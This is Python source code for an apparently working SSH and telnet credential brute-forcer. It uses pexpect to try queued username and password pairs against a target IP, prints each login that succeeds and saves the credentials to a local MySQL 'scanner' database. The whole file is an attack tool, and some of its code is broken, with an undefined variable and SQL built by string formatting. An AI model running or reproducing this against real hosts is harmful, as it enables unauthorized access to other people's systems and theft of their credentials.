import pexpect
import MySQLdb
import time

from pexpect import ExceptionPexpect, TIMEOUT, EOF

class ExceptionSSH(ExceptionPexpect):
    ''' Raised SSH exception.
    '''
class Connection:
    def __init__(self, ip, auth_queue, handle):
        self.auth_queue = auth_queue
        self.ip = ip
        self.hLog = handle
        self.auth = None
        self.child = None
        self.bQuit = False
        self.terminal_type = 'ansi'
        self.sync_multiplier = 1
        self.auto_prompt_reset = False

    def levenshtein_distance(self, a, b):
        '''This calculates the Levenshtein distance between a and b.
        '''

        n, m = len(a), len(b)
        if n > m:
            a,b = b,a
            n,m = m,n
        current = range(n+1)
        for i in range(1,m+1):
            previous, current = current, [i]+[0]*n
            for j in range(1,n+1):
                add, delete = previous[j]+1, current[j-1]+1
                change = previous[j-1]
                if a[j-1] != b[i-1]:
                    change = change + 1
                current[j] = min(add, delete, change)
        
        return current[n]

    def try_read_prompt(self, timeout_multiplier):
        '''This facilitates using communication timeouts to perform
        synchronization as quickly as possible, while supporting high latency
        connections with a tunable worst case performance. Fast connections
        should be read almost immediately. Worst case performance for this
        method is timeout_multiplier * 3 seconds.
        '''

        # maximum time allowed to read the first response
        first_char_timeout = timeout_multiplier * 0.5

        # maximum time allowed between subsequent characters
        inter_char_timeout = timeout_multiplier * 0.1

        # maximum time for reading the entire prompt
        total_timeout = timeout_multiplier * 3.0

        prompt = self.child.string_type()
        begin = time.time()
        expired = 0.0
        timeout = first_char_timeout

        while expired < total_timeout:
            try:
                prompt += self.child.read_nonblocking(size=1, timeout=timeout)
                expired = time.time() - begin # updated total time expired
                timeout = inter_char_timeout
            except TIMEOUT:
                break

        return prompt
    
    def sync_original_prompt(self, sync_multiplier=1.0):
        '''This attempts to find the prompt. Basically, press enter and record
        the response; press enter again and record the response; if the two
        responses are similar then assume we are at the original prompt.
        This can be a slow function. Worst case with the default sync_multiplier
        can take 12 seconds. Low latency connections are more likely to fail
        with a low sync_multiplier. Best case sync time gets worse with a
        high sync multiplier (500 ms with default). '''

        # All of these timing pace values are magic.
        # I came up with these based on what seemed reliable for
        # connecting to a heavily loaded machine I have.
        self.child.sendline()
        time.sleep(0.1)

        try:
            # Clear the buffer before getting the prompt.
            self.try_read_prompt(sync_multiplier)
        except TIMEOUT:
            pass

        self.child.sendline()
        x = self.try_read_prompt(sync_multiplier)

        self.child.sendline()
        a = self.try_read_prompt(sync_multiplier)

        self.child.sendline()
        b = self.try_read_prompt(sync_multiplier)

        ld = self.levenshtein_distance(a,b)
        len_a = len(a)
        if len_a == 0:
            return False
        if float(ld)/len_a < 0.4:
            return True
        
        return False

    def set_unique_prompt(self):
        '''This sets the remote prompt to something more unique than ``#`` or ``$``.
        This makes it easier for the :meth:`prompt` method to match the shell prompt
        unambiguously. This method is called automatically by the :meth:`login`
        method, but you may want to call it manually if you somehow reset the
        shell prompt. For example, if you 'su' to a different user then you
        will need to manually reset the prompt. This sends shell commands to
        the remote host to set the prompt, so this assumes the remote host is
        ready to receive commands.
        Alternatively, you may use your own prompt pattern. In this case you
        should call :meth:`login` with ``auto_prompt_reset=False``; then set the
        :attr:`PROMPT` attribute to a regular expression. After that, the
        :meth:`prompt` method will try to match your prompt pattern.
        '''

        self.sendline("unset PROMPT_COMMAND")
        self.sendline(self.PROMPT_SET_SH) # sh-style
        i = self.expect ([TIMEOUT, self.PROMPT], timeout=10)
        if i == 0: # csh-style
            self.sendline(self.PROMPT_SET_CSH)
            i = self.expect([TIMEOUT, self.PROMPT], timeout=10)
            if i == 0:
                return False
        return True

    def login(self, ip, user, pwd):
        self.child = pexpect.spawn("ssh -l %s %s" % (user, self.ip))
        self.child.logfile_read = self.hLog
        i = self.child.expect(  ["(?i)are you sure you want to continue connecting", 
                                r"[#$]", 
                                "(?i)(?:password)|(?:passphrase for key)", 
                                "(?i)permission denied", 
                                "(?i)terminal type", 
                                "(?i)connection refused",
                                TIMEOUT, 
                                "(?i)connection closed by remote host", 
                                EOF], timeout=15)

        # First phase
        if i==0:
            # New certificate -- always accept it.
            # This is what you get if SSH does not have the remote host's
            # public key stored in the 'known_hosts' cache.
            self.child.sendline("yes")
            i = self.child.expect(  ["(?i)are you sure you want to continue connecting", 
                                    r"[#$]", 
                                    "(?i)(?:password)|(?:passphrase for key)", 
                                    "(?i)permission denied", 
                                    "(?i)terminal type", 
                                    "(?i)connection refused",
                                    TIMEOUT,
                                    "(?i)connection closed by remote host", 
                                    EOF], timeout=15)
        if i==2: # password or passphrase
            self.child.sendline(pwd)
            i = self.child.expect(  ["(?i)are you sure you want to continue connecting",
                                    r"[#$]", 
                                    "(?i)(?:password)|(?:passphrase for key)", 
                                    "(?i)permission denied", 
                                    "(?i)terminal type", 
                                    "(?i)connection refused",
                                    TIMEOUT,
                                    "(?i)connection closed by remote host", 
                                    EOF], timeout=15)
        if i==4:
            self.child.sendline(self.terminal_type)
            i = self.child.expect(  ["(?i)are you sure you want to continue connecting",
                                    r"[#$]", 
                                    "(?i)(?:password)|(?:passphrase for key)", 
                                    "(?i)permission denied", 
                                    "(?i)terminal type", 
                                    "(?i)connection refused",
                                    TIMEOUT,
                                    "(?i)connection closed by remote host", 
                                    EOF], timeout=15)
        if i==8:
            self.child.close()
            self.bQuit = True
            raise ExceptionSSH('Could not establish connection to host')

        # Second phase
        if i==0:
            # This is weird. This should not happen twice in a row.
            self.child.close()
            self.bQuit = True
            raise ExceptionSSH('Weird error. Got "are you sure" prompt twice.')
        elif i==1: # can occur if you have a public key pair set to authenticate.
            ### TODO: May NOT be OK if expect() got tricked and matched a false prompt.
            pass
        elif i==2: # password prompt again
            # For incorrect passwords, some ssh servers will
            # ask for the password again, others return 'denied' right away.
            # If we get the password prompt again then this means
            # we didn't get the password right the first time.
            self.child.close()
            raise ExceptionSSH('password refused')
        elif i==3: # permission denied -- password was bad.
            self.child.close()
            raise ExceptionSSH('permission denied')
        elif i==4: # terminal type again? WTF?
            self.child.close()
            raise ExceptionSSH('Weird error. Got "terminal type" prompt twice.')
        elif i==5: # connection refused -- ip filter
            self.child.close()
            self.bQuit = True
            raise ExceptionSSH('connection refused')
        elif i==6: # Timeout
            #This is tricky... I presume that we are at the command-line prompt.
            #It may be that the shell prompt was so weird that we couldn't match
            #it. Or it may be that we couldn't log in for some other reason. I
            #can't be sure, but it's safe to guess that we did login because if
            #I presume wrong and we are not logged in then this should be caught
            #later when I try to set the shell prompt.
            self.bQuit = True
            raise ExceptionSSH('connection time out')
            pass
        elif i==7: # Connection closed by remote host
            self.child.close()
            self.bQuit = True
            raise ExceptionSSH('connection closed')
        else: # Unexpected
            self.child.close()
            raise ExceptionSSH('unexpected login response')
        
        if not self.sync_original_prompt(self.sync_multiplier):
            self.child.close()
            raise ExceptionSSH('could not synchronize with original prompt')
    
        # We appear to be in.
        # set shell prompt to something unique.
        if self.auto_prompt_reset:
            if not self.set_unique_prompt():
                self.child.close()
                raise ExceptionSSH(   'could not set shell prompt '
                                        '(received: %r, expected: %r).' % (
                                        self.before, self.PROMPT,))
        return True


    def logout (self):
        '''Sends exit to the remote shell.
        If there are stopped jobs then this automatically sends exit twice.
        '''
        self.child.sendline("exit")
        index = self.child.expect([EOF, "(?i)there are stopped jobs"])
        if index==1:
            self.child.sendline("exit")
            self.child.expect(EOF)
        self.child.close()

    def run(self):
        try:
            user, pwd = self.auth_queue.pop()
            self.login(self.ip, user, pwd)
            print("Got password [%s] %s:%s" % (self.ip, user, pwd))
            self.write_to_db(self.ip, user, pwd)
            self.logout() 
        except ExceptionSSH as e:  
            self.hLog.write("ssh failed on login. error is: %s \n" % str(e))
            self.exit()
        except IndexError:
            self.bQuit = True
            self.exit()
    
    def write_to_db(self, ip, user, pwd):
        try:
            db = MySQLdb.connect("localhost", "scanner",
                                 "scanner", "scanner", charset="utf8")
            cursor = db.cursor()
            cursor.execute("INSERT INTO auth_table(ip,port,username,password, loc) values('%s','%d','%s','%s','%s')" % (
                ip, 22, user, passwd, '' ))
            db.commit()
            print("[report] One result import to database")
        except:
            db.rollback()
        self.bQuit = True
        db.close()


    def exit(self):
        if self.child:
            self.child.close(force=True)


class conn_state:
    @staticmethod
    def _run(conn):
        try:
            conn.child = pexpect.spawn("ssh %s" % conn.ip)
            conn.child.logfile_read = conn.hLog
            index = conn.child.expect(["sername:", "nter:", "ogin:","ccount:",
                                    "eject","refused","denied", pexpect.TIMEOUT, pexpect.EOF], timeout=30)
            if index < 4:
                # print "Got flag %s" % conn.ip
                conn.auth = None
                conn.new_state(user_state)
            else:
                conn.bQuit = True
                return
        except:
            conn.hLog.write("\r\nSomething wrong in  conn_state._run().")
            conn.new_state(conn)

class user_state:
    @staticmethod
    def _run(conn):
        try:
            conn.auth = conn.auth_queue.pop()
        except IndexError:
            conn.bQuit = True
            return
        except:
            conn.bQuit = True
            return

        user = conn.auth[0]
        conn.hLog.write("\r\nPreparing send username (%s) to remote host." % user)
        conn.child.sendline(user)
        index = conn.child.expect(["ssword:", "sername:", "nter:","ccount:",
                                   "ogin:", pexpect.TIMEOUT, pexpect.EOF], timeout=30)
        if index == 0:
            conn.new_state(passwd_state)
        elif index < 5:
            conn.new_state(user_state)
        else:
            conn.new_state(conn_state)


class passwd_state:
    @staticmethod
    def _run(conn):
        if conn.auth:
            passwd = conn.auth[1]
        else:
            conn.bQuit = True
            return

        conn.hLog.write("\r\nPreparing send password (%s) to remote host." % passwd)
        conn.child.sendline(passwd)
        #"(?i)username:","(?i)enter:","(?i)account:","(?i)login:","(?i)pssword:",
        index = conn.child.expect([r"[>$~/]", "sername:", "nter:", "ccount:",
                                   "login:", pexpect.TIMEOUT, pexpect.EOF], timeout=30)
        if index == 0:
            conn.new_state(confirm_state)
        elif index < 4 and index > 0:
            conn.new_state(user_state)
        else:
            conn.new_state(conn_state)


class confirm_state:
    @staticmethod
    def _run(conn):
        try:
            user, passwd = conn.auth
            if conn.auth == ("user", "password"):
                conn.bQuit = True
                return
            print("Got password [%s] %s:%s" % (conn.ip, user, passwd))
            db = MySQLdb.connect("localhost", "telnet",
                                 "telnet", "telnet_data", charset="utf8")
            cursor = db.cursor()
            cursor.execute("INSERT INTO auth_table(ip,port,username,password,loc) values('%s','%d','%s','%s','%s')" % (
                conn.ip, 23, user, passwd, ""))
            db.commit()
            print("[report] One result import to database")
        except:
            db.rollback()
        conn.bQuit = True
        conn.new_state(None)
        db.close()
